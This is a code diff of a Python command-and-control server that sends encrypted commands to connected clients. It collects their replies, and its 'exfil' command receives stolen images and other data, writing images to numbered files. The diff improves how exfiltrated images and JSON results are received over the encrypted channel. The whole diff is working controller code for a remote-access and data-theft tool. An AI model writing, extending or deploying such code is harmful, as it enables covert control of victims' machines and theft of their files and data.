@@ -3,6 +3,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 import os
+import json
 
 SERVER_IP = '172.31.4.131'
 SERVER_PORT = 8080
@@ -77,48 +78,50 @@ while True:
 
         conn.sendall(encrypt_tdes(key, message.encode()))
 
-        data = []
-        while True:
-            client_side = conn.recv(4096)
-
-            if client_side == "Done":
-                print("Breaking")
-                break
-            
-            print("Received new data")
-            data += client_side
-
-        if len(data) == 0:
-            print("Connection to {} closed".format(addr[0]))
-            break
-
         if message.split(' ')[0] == "exfil":
             if len(message.split(' ')) > 1 and message.split(' ')[1] == "image":
-                response = decrypt_aes(key, data)
-                # while True:
-                #     r = decrypt_aes(key, conn.recv(4096))
-                #     if not r:
-                #         break
-                #     response += r
-                # print("Image data received successfully!")
+                response = []
 
+                img_size = decrypt_aes(key, conn.recv(1024)).decode()
+                rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
+
+                response = decrypt_aes(key, rec_msg)
+                print("Image data received successfully!")
+
+                f = open(f"images/received_image_{i}.jpg", "x+")
+                f.close()
                 with open(f"images/received_image_{i}.jpg", "wb") as f:
                     f.write(response)
 
                 print("Image file written successfully!")
+                i += 1
             else:
-                response = decrypt_aes(key, data)
-                # while True:
-                #     r = decrypt_aes(key, conn.recv(4096))
-                #     if not r:
-                #         break
-                #     response += r
-        else:  
-            response = decrypt_tdes(key, data)
-            # while True:
-                
-            #     if not r:
-            #         break
-            #     response += r
+                response = []
+                while True:
+                    r = decrypt_aes(key, conn.recv(4096)).decode()
 
-        print(response.decode())
+                    if "Done" in r:
+                        break
+
+                    if len(response) == 0:
+                        response = json.loads(r)
+                    else:
+                        response += json.loads(r)
+        else:  
+            response = []
+            while True:
+                r = decrypt_tdes(key, conn.recv(4096)).decode()
+
+                if "Done" in r:
+                    break
+
+                if len(response) == 0:
+                    response = json.loads(r)
+                else:
+                    response += json.loads(r)
+
+        print(response)
+
+        if len(response) == 0:
+            print("Connection to {} closed".format(addr[0]))
+            break
